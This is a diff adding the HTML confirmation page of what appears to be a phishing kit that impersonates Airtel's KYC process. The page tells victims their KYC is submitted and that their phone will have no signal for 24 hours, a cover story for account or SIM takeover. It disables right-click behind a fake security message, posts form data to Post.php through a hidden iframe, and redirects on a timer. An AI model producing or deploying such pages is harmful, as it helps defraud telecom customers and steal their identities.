@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet">
+    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'><link rel="stylesheet" href="./style.css">
+    <title>Airtel | KYC Sucessfully Submited</title>
+    <style>
+    #hh,#jj
+    {
+    width: 105%;
+    margin:-8px;
+    margin-left:-8px;
+    }
+    #btn
+    {
+    width: 150px;
+    background-color: red;
+    color: white;
+    outline:none;
+    border-style: solid;
+    margin-top:10%;
+    border-color:red;
+    border-radius: 25px;
+    border-width: 1px;
+    cursor: pointer;
+    font-size: 15px;
+    height: 36px;
+    margin-left: 2px;
+    font-weight:bold;
+    font-family: 'Quicksand', sans-serif;
+    }
+    #btn:hover
+    {
+    background-color:white;
+    color: red;
+    outline:none;
+    border:solid red;
+    border-width: 2px;
+    border-radius: 25px;
+    border-width:1px;
+    cursor: pointer;
+    font-size: 15px;
+    height: 36px;
+    font-weight:bold;
+    font-family: 'Quicksand', sans-serif;
+    }
+    #kyc
+    {
+    width:102%;   
+    background-color:#CFE2FF;
+    padding:15px;
+    margin-top:15px;
+    margin-left:-3px;
+    }
+    #rr
+    { 
+    width: 20%;
+    margin:5px;
+    
+    }
+    </style>
+    <script language="javascript">
+    
+    var message="For security reasons,This function is not allowed here.";
+    function clickIE4(){
+    
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+    
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+    
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+    }
+    
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+    }
+    
+    document.oncontextmenu=new Function("alert(message);return false;")
+    
+    </script>
+    </head>
+    <body onload="startTimer();" style="background-color:#ffffff;">
+    <center><img src="Airtel_Logo.png" style="width:50%;" alt=""></center>
+    <div style="text-align:center;">
+    <div class="line">
+    <!-- Static- Please don't do anything here-->
+    <script type="text/javascript">var submitted=false;</script>
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='index.html';}"></iframe>
+    <!--My Form-->
+    <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    </div>
+    <div id="kyc">
+    <b style="font-family: 'Mulish', sans-serif; color:#084198; font-size:14px; margin-left:-15%;">REQUEST SUBMITED SUCCESSFULLY</b>
+    </div>
+    <div id="col">
+    <br>
+    <center> <img src="ticked.png" alt="" id="rr"> </center>
+    <form action="index.html" method="">
+    <center> <h5
+    style="font-family: 'Mulish', sans-serif; color:green">Your KYC has been successfully submited
+    </h5></center>
+    <center> <h3
+    style="font-family: 'Mulish', sans-serif; color:grey; font-size:14px; margin:5px;">It may take 24 hours for KYC to be<br>fully updated. Your mobile will not have<br>signal for the next 24 hours.</h3></center><br><br>
+    <b style="font-family: 'Mulish', sans-serif; color:green; font-size:14px; margin-left:10px;">Please be patient<br>Thank You, Have a nice day.</b><br>
+    <div id="kk">
+    <center><button type="submit" id="btn" >EXIT </button></center> <br>
+    </div>
+    <script type="text/javascript">
+    var timer=120;
+    var sec=0;
+    function startTimer() {
+    sec=parseInt(timer%120);
+    
+    if (timer<2) {
+    // timer.stop();
+    window.location.href = "index.html";
+    }
+    
+    document.getElementById("time").innerHTML = "<b>This screen will automatically timeout after : </b>"+sec.toString();
+    timer--;
+    setTimeout(function(){
+    startTimer();
+    
+    }, 1000);
+    }
+    
+    </script>
+    <div>
+    <b style="color:red; font-family: 'Mulish', sans-serif; font-size:15px;"><span style="color:red; font-family: 'Mulish', sans-serif; font-size:15px;" id="time"></span>&nbsp;second</b>
+    </div>
+    </div>
+    </body>
+    </html>
